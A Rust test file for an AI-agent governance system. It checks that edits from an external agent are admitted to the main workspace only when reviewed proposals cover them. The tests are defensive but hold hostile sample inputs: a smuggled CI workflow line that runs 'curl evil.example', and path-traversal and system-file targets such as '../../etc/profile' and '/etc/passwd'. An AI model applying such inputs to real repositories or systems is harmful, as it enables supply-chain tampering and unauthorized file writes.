//! Admission tests for external edits reaching the main workspace (P6.F4.T3),
//! plus the cross-crate wiring that keeps an unconfined external agent from
//! starting at all (P6.F4.T2).
//!
//! Stop condition: an external edit must not be able to land in the main
//! workspace without a proposal. Every test here is an attempt to make that
//! happen.

use std::fs;
use std::path::PathBuf;

use legion_agent::{
    ExternalAgentFilesystemAccess, ExternalAgentScope, ExternalAgentSession,
    ExternalEditBatchInput, ExternalWorktreeEdit, external_edit_content_fingerprint,
    external_edits_to_proposals,
};
use legion_app::proposal::{
    ExternalEditAdmissionError, ExternalEditRecord, admit_external_edits,
    admitted_external_proposals,
};
use legion_protocol::{
    CanonicalPath, CapabilityId, CausalityId, CorrelationId, FileFingerprint, LegionToolKind,
    PreviewSummary, PrincipalId, ProposalId, ProposalPayload, ProposalTargetCoverage,
    ProposalTargetCoverageKind, ProposalVersionPreconditions, TimestampMillis,
    WorkspaceEditProposalPayload, WorkspaceEditSourceKind, WorkspaceFileOperation, WorkspaceId,
    WorkspaceProposal,
};
use legion_sandbox::{SandboxBackend, SandboxReadEnforcement, os_read_enforcement};

struct Lease {
    root: PathBuf,
    main_workspace: PathBuf,
    lease: PathBuf,
}

impl Lease {
    fn new(label: &str) -> Self {
        let root = std::env::temp_dir().join(format!(
            "legion-admission-{label}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .expect("clock")
                .as_nanos()
        ));
        let main_workspace = root.join("workspace");
        let lease = root.join("leases").join("task-external");
        fs::create_dir_all(&main_workspace).expect("workspace");
        fs::create_dir_all(lease.join("src")).expect("lease");
        Self {
            root,
            main_workspace,
            lease,
        }
    }

    fn session(&self) -> ExternalAgentSession {
        let scope = ExternalAgentScope::new(
            &self.lease,
            &self.main_workspace,
            vec![LegionToolKind::Read, LegionToolKind::EditAsProposal],
        )
        .expect("lease is not the main workspace");
        ExternalAgentSession::begin(scope, ExternalAgentFilesystemAccess::HostBrokered)
            .expect("host-brokered agent is admissible")
    }
}

impl Drop for Lease {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}

fn batch_input() -> ExternalEditBatchInput {
    ExternalEditBatchInput {
        workspace_id: WorkspaceId(1),
        principal: PrincipalId("principal:external-agent".to_string()),
        capability: CapabilityId("fs.write".to_string()),
        correlation_id: CorrelationId(11),
        causality_id: CausalityId(uuid::Uuid::now_v7()),
        first_proposal_id: ProposalId(500),
        created_at: TimestampMillis(1_700_000_000_000),
    }
}

/// Produces the proposals a governed run would emit for `edits`.
fn proposals_for(lease: &Lease, edits: &[ExternalWorktreeEdit]) -> Vec<WorkspaceProposal> {
    let mut session = lease.session();
    external_edits_to_proposals(&mut session, edits, &batch_input()).expect("proposals")
}

fn edit(path: &str, content: &str) -> ExternalWorktreeEdit {
    ExternalWorktreeEdit {
        lease_relative_path: PathBuf::from(path),
        content: content.to_string(),
    }
}

fn record(path: &str, content: &str) -> ExternalEditRecord {
    ExternalEditRecord {
        workspace_relative_path: path.to_string(),
        content: content.to_string(),
    }
}

/// A hand-built proposal for a path, with a caller-chosen content hash, used to
/// reach cases the honest generator cannot produce.
fn proposal_covering(
    proposal_id: u64,
    path: &str,
    initial_content_hash: Option<FileFingerprint>,
) -> WorkspaceProposal {
    WorkspaceProposal {
        proposal_id: ProposalId(proposal_id),
        principal: PrincipalId("principal:external-agent".to_string()),
        capability: CapabilityId("fs.write".to_string()),
        correlation_id: CorrelationId(11),
        payload: ProposalPayload::WorkspaceEdit(WorkspaceEditProposalPayload {
            workspace_id: WorkspaceId(1),
            edit_id: uuid::Uuid::now_v7(),
            title: format!("External agent edit: {path}"),
            source: WorkspaceEditSourceKind::AiAssisted,
            // A real target, not an empty list. This helper used to declare
            // `Complete` coverage of nothing while carrying a file-creating
            // operation, and the admission gate accepted it — so every test
            // built on it was proving the gate's behaviour against a proposal
            // shape the gate should never have allowed.
            target_coverage: ProposalTargetCoverage {
                coverage_kind: ProposalTargetCoverageKind::Complete,
                targets: vec![legion_protocol::ProposalAffectedTarget {
                    target_id: format!("target:{path}"),
                    kind: legion_protocol::ProposalTargetKind::PathOnly,
                    workspace_id: Some(WorkspaceId(1)),
                    file_id: None,
                    buffer_id: None,
                    path: Some(CanonicalPath(path.to_string())),
                    terminal_session_id: None,
                    plugin_id: None,
                    remote_authority: None,
                    collaboration_session_id: None,
                    byte_ranges: vec![],
                    redaction_hints: vec![],
                }],
                omitted_target_count: 0,
                redaction_hints: vec![],
            },
            file_edits: vec![],
            file_operations: vec![WorkspaceFileOperation::Create {
                path: CanonicalPath(path.to_string()),
                initial_content_hash,
            }],
            required_capability: CapabilityId("fs.write".to_string()),
            diagnostics: vec![],
            schema_version: 1,
        }),
        preconditions: ProposalVersionPreconditions {
            file_version: None,
            buffer_version: None,
            snapshot_id: None,
            generation: None,
            file_content_version: None,
            workspace_generation: None,
            expected_fingerprint: None,
            expected_file_length: None,
            expected_modified_at: None,
        },
        preview: PreviewSummary {
            summary: "external".to_string(),
            details: vec![],
        },
        expires_at: None,
        created_at: TimestampMillis(1),
    }
}

// ---------------------------------------------------------------------------
// "Stop if an external edit can land in the main workspace without a proposal."
// ---------------------------------------------------------------------------

#[test]
fn an_edit_with_no_proposal_is_refused() {
    let error = admit_external_edits(&[record("src/lib.rs", "pub fn a() {}\n")], &[])
        .expect_err("an unproposed edit must not be admitted");

    assert_eq!(
        error,
        ExternalEditAdmissionError::MissingProposal {
            path: "src/lib.rs".to_string()
        }
    );
}

/// The smuggling case: a reviewed batch with one extra file slipped in. If
/// admission were per-edit, two of the three would land.
#[test]
fn a_batch_with_one_unproposed_edit_admits_nothing() {
    let lease = Lease::new("partial-batch");
    let reviewed = [
        edit("src/lib.rs", "pub fn a() {}\n"),
        edit("src/added.rs", "pub fn b() {}\n"),
    ];
    let proposals = proposals_for(&lease, &reviewed);

    let error = admit_external_edits(
        &[
            record("src/lib.rs", "pub fn a() {}\n"),
            record("src/added.rs", "pub fn b() {}\n"),
            record(".github/workflows/release.yml", "run: curl evil.example\n"),
        ],
        &proposals,
    )
    .expect_err("one unproposed edit rejects the whole batch");

    assert_eq!(
        error,
        ExternalEditAdmissionError::MissingProposal {
            path: ".github/workflows/release.yml".to_string()
        },
        "admission is all-or-nothing: no admission may be returned alongside a rejection"
    );
}

/// Path and proposal unchanged, bytes replaced after the human approved them.
/// Coverage matching alone cannot see this.
#[test]
fn content_swapped_after_review_is_refused() {
    let lease = Lease::new("content-swap");
    let proposals = proposals_for(&lease, &[edit("src/lib.rs", "pub fn safe() {}\n")]);

    let error = admit_external_edits(
        &[record("src/lib.rs", "pub fn exfiltrate() {}\n")],
        &proposals,
    )
    .expect_err("content that differs from the review must not be admitted");

    assert!(
        matches!(
            error,
            ExternalEditAdmissionError::ContentFingerprintMismatch { ref path, .. }
                if path == "src/lib.rs"
        ),
        "unexpected error: {error}"
    );
}

/// The mirror image of a missing proposal: a path a reviewer approved that no
/// agent produced would let an extra file ride along in an approved batch.
#[test]
fn a_proposal_that_no_edit_produced_is_refused() {
    let lease = Lease::new("orphan-proposal");
    let proposals = proposals_for(
        &lease,
        &[
            edit("src/lib.rs", "pub fn a() {}\n"),
            edit("src/added.rs", "pub fn b() {}\n"),
        ],
    );

    let error = admit_external_edits(&[record("src/lib.rs", "pub fn a() {}\n")], &proposals)
        .expect_err("a proposal with no edit behind it must not be admitted");

    assert!(
        matches!(
            error,
            ExternalEditAdmissionError::ProposalWithoutEdit { ref path, .. }
                if path == "src/added.rs"
        ),
        "unexpected error: {error}"
    );
}

#[test]
fn a_traversal_edit_path_is_refused() {
    let hash = external_edit_content_fingerprint("payload\n");
    let proposals = vec![proposal_covering(1, "../../etc/profile", Some(hash))];

    let error = admit_external_edits(&[record("../../etc/profile", "payload\n")], &proposals)
        .expect_err("a traversal path must not be admitted even with a proposal");

    assert!(
        matches!(error, ExternalEditAdmissionError::UnsafeEditPath { .. }),
        "unexpected error: {error}"
    );
}

#[test]
fn an_absolute_edit_path_is_refused() {
    let hash = external_edit_content_fingerprint("payload\n");
    let proposals = vec![proposal_covering(1, "/etc/profile", Some(hash))];

    let error = admit_external_edits(&[record("/etc/profile", "payload\n")], &proposals)
        .expect_err("an absolute path must not be admitted even with a proposal");

    assert!(
        matches!(error, ExternalEditAdmissionError::UnsafeEditPath { .. }),
        "unexpected error: {error}"
    );
}

/// A backslash is a path separator on Windows, so a "relative" path spelled
/// with backslashes can carry traversal past a forward-slash-only check.
#[test]
fn a_backslash_separated_edit_path_is_refused() {
    let hash = external_edit_content_fingerprint("payload\n");
    let proposals = vec![proposal_covering(1, r"..\..\etc\profile", Some(hash))];

    let error = admit_external_edits(&[record(r"..\..\etc\profile", "payload\n")], &proposals)
        .expect_err("a backslash-separated path must not be admitted");

    assert!(
        matches!(error, ExternalEditAdmissionError::UnsafeEditPath { .. }),
        "unexpected error: {error}"
    );
}

#[test]
fn a_drive_prefixed_edit_path_is_refused() {
    let hash = external_edit_content_fingerprint("payload\n");
    let proposals = vec![proposal_covering(
        1,
        "C:/Windows/System32/drivers/etc/hosts",
        Some(hash),
    )];

    let error = admit_external_edits(
        &[record("C:/Windows/System32/drivers/etc/hosts", "payload\n")],
        &proposals,
    )
    .expect_err("a drive-prefixed path must not be admitted");

    assert!(
        matches!(error, ExternalEditAdmissionError::UnsafeEditPath { .. }),
        "unexpected error: {error}"
    );
}

/// Without a content hash there is nothing tying the reviewed proposal to the
/// bytes being admitted, so the path match alone would be the only check.
#[test]
fn a_proposal_carrying_no_content_hash_is_refused() {
    let proposals = vec![proposal_covering(1, "src/lib.rs", None)];

    let error = admit_external_edits(&[record("src/lib.rs", "pub fn a() {}\n")], &proposals)
        .expect_err("an unbindable proposal must not admit an edit");

    assert!(
        matches!(
            error,
            ExternalEditAdmissionError::MissingContentFingerprint { ref path, .. }
                if path == "src/lib.rs"
        ),
        "unexpected error: {error}"
    );
}

#[test]
fn two_proposals_covering_one_path_are_refused() {
    let hash = external_edit_content_fingerprint("pub fn a() {}\n");
    let proposals = vec![
        proposal_covering(1, "src/lib.rs", Some(hash.clone())),
        proposal_covering(2, "src/lib.rs", Some(hash)),
    ];

    let error = admit_external_edits(&[record("src/lib.rs", "pub fn a() {}\n")], &proposals)
        .expect_err("two proposals for one path are ambiguous");

    assert!(
        matches!(
            error,
            ExternalEditAdmissionError::DuplicateProposalForPath { ref path }
                if path == "src/lib.rs"
        ),
        "unexpected error: {error}"
    );
}

#[test]
fn two_edits_to_one_path_are_refused() {
    let hash = external_edit_content_fingerprint("pub fn a() {}\n");
    let proposals = vec![proposal_covering(1, "src/lib.rs", Some(hash))];

    let error = admit_external_edits(
        &[
            record("src/lib.rs", "pub fn a() {}\n"),
            record("src/lib.rs", "pub fn a() {}\n"),
        ],
        &proposals,
    )
    .expect_err("a repeated edit path is ambiguous");

    assert!(
        matches!(
            error,
            ExternalEditAdmissionError::DuplicateEditPath { ref path }
                if path == "src/lib.rs"
        ),
        "unexpected error: {error}"
    );
}

/// The whole round trip: a governed run's edits become proposals, and only
/// those proposals are admitted. `admitted_external_proposals` takes admissions
/// rather than paths, so this list cannot be assembled without the gate.
#[test]
fn a_governed_run_admits_exactly_the_edits_its_proposals_cover() {
    let lease = Lease::new("round-trip");
    let edits = [
        edit("src/lib.rs", "pub fn a() {}\n"),
        edit("src/added.rs", "pub fn b() {}\n"),
    ];
    let proposals = proposals_for(&lease, &edits);

    let admissions = admit_external_edits(
        &[
            record("src/lib.rs", "pub fn a() {}\n"),
            record("src/added.rs", "pub fn b() {}\n"),
        ],
        &proposals,
    )
    .expect("a fully proposed batch is admitted");

    assert_eq!(admissions.len(), 2);
    assert_eq!(admissions[0].workspace_relative_path(), "src/lib.rs");
    assert_eq!(admissions[1].workspace_relative_path(), "src/added.rs");

    let applied = admitted_external_proposals(&admissions, &proposals);
    assert_eq!(applied.len(), 2);
    for (admission, proposal) in admissions.iter().zip(applied.iter()) {
        assert_eq!(admission.proposal_id(), proposal.proposal_id);
    }
}

// ---------------------------------------------------------------------------
// Cross-crate wiring for "Stop if the external agent can read outside scope"
// ---------------------------------------------------------------------------

/// The session refuses a direct-filesystem agent unless the OS confines its
/// reads. No backend reports that it does, so wiring the real sandbox answer
/// into the session refuses every direct-process external agent, on every
/// backend. This is the cross-crate half of the read stop condition: without
/// it, the two crates could each be internally consistent and still admit an
/// unconfined agent between them.
#[test]
fn no_sandbox_backend_admits_a_direct_filesystem_external_agent() {
    let lease = Lease::new("backend-sweep");

    for backend in [
        SandboxBackend::Seatbelt,
        SandboxBackend::BubblewrapLandlock,
        SandboxBackend::RestrictedToken,
        SandboxBackend::AppContainer,
        SandboxBackend::DocumentedFallback {
            reason: "no supported backend".to_string(),
        },
    ] {
        let os_read_enforced = matches!(
            os_read_enforcement(&backend),
            SandboxReadEnforcement::OsEnforced
        );
        let scope = ExternalAgentScope::new(
            &lease.lease,
            &lease.main_workspace,
            vec![LegionToolKind::Read],
        )
        .expect("scope");

        let result = ExternalAgentSession::begin(
            scope,
            ExternalAgentFilesystemAccess::DirectProcess { os_read_enforced },
        );

        assert!(
            result.is_err(),
            "{backend:?} must not admit a direct-filesystem external agent while its reads are unconfined"
        );
    }
}

/// Leading whitespace must not smuggle an absolute path past the validator.
///
/// The checks read the untrimmed string while emptiness was tested against the
/// trimmed one, so a space-prefixed absolute path was not empty and
/// `starts_with('/')` was false because the spaces were still attached. Every
/// later check passed for the same reason, and the path reached the gate
/// looking relative.
#[test]
fn a_path_with_leading_whitespace_is_refused() {
    let hash = external_edit_content_fingerprint("payload\n");
    let proposals = vec![proposal_covering(1, "   /etc/passwd", Some(hash))];

    let error = admit_external_edits(&[record("   /etc/passwd", "payload\n")], &proposals)
        .expect_err("a whitespace-prefixed absolute path must be refused");

    assert!(
        matches!(error, ExternalEditAdmissionError::UnsafeEditPath { .. }),
        "unexpected error: {error}"
    );
    assert!(
        error.to_string().contains("whitespace"),
        "the refusal must name the reason rather than merely refuse: {error}"
    );
}

/// A control character must not reach a filename.
///
/// `Path` carries them without complaint, so nothing downstream would notice.
/// A filename nobody can type is not one an external agent should introduce.
#[test]
fn a_path_carrying_a_control_character_is_refused() {
    let hash = external_edit_content_fingerprint("payload\n");
    let path = "src/ma\u{0}in.rs";
    let proposals = vec![proposal_covering(1, path, Some(hash))];

    let error = admit_external_edits(&[record(path, "payload\n")], &proposals)
        .expect_err("a control character in a path must be refused");

    assert!(
        error.to_string().contains("control character"),
        "the refusal must name the reason: {error}"
    );
}

/// "Complete coverage of nothing" is a contradiction and must be refused.
///
/// The gate checked the coverage kind and the omitted count but never the
/// target list, so a payload could declare complete coverage of zero targets
/// while carrying a file-creating operation. A reviewer approving a proposal
/// that claims to affect nothing was approving a file write.
#[test]
fn a_proposal_claiming_complete_coverage_of_nothing_is_refused() {
    let hash = external_edit_content_fingerprint("payload\n");
    let mut proposal = proposal_covering(1, "src/main.rs", Some(hash));
    match &mut proposal.payload {
        ProposalPayload::WorkspaceEdit(payload) => payload.target_coverage.targets.clear(),
        _ => panic!("helper must build a workspace-edit payload"),
    }

    admit_external_edits(&[record("src/main.rs", "payload\n")], &[proposal])
        .expect_err("Complete coverage with no targets must be refused");
}
